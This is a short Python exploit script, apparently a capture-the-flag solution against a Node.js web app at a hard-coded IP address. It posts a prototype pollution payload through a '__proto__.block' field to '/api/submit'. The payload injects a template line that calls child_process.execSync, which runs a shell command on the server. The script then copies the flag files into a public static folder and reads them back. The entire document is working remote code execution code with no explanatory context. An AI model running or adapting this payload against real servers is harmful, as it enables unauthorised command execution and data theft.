import requests

url = 'http://138.68.155.238:31391'

cmd = 'cat flag* > /app/static/out.txt'

# make pollution
r = requests.post(url+'/api/submit', json = {
        "artist.name":"Gingell",
        "__proto__.block": {
            "type": "Text",
            "line":"process.mainModule.require('child_process').execSync(`"+cmd+"`).toString()"
        }
    })

print("COMMAND INJECTED\n"+"_"*30)
print(cmd+"\n")
print("OUTPUT\n"+"_"*30)
print(requests.get(url+'/static/out.txt').text)
